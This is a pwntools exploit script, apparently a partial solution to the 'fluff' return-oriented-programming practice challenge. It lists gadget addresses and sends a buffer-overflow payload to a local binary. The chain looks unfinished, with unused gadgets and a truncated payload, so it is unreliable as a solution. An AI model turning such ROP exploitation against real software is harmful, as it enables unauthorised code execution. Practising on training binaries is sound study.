#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template fluff
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'fluff')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

ret_gadget = p64(0x400639) #ret
pop_rdi = 0x4006a3 # pop rdi ; ret

#BEXTR destination (RBX), source (RCX), mask (RDX)
bextr_gadget = 0x400634 #bextr  rbx,rcx,rdx
sus_gadget = 0x4005e7 #add byte ptr [rcx], al ; pop rbp ; ret
pop_rcx = p64(0x40062b) # pop rcx
al_into_rcx  = p64(0x4005e7) # add byte ptr [rcx], al ; pop rbp ; ret

writable_area = p64(0x601028)

payload = b'A' * 32 + p64(0) + ret_gadget + pop_rcx + writable_area + al_into_rcx

io.sendlineafter('> ', payload)


io.interactive()

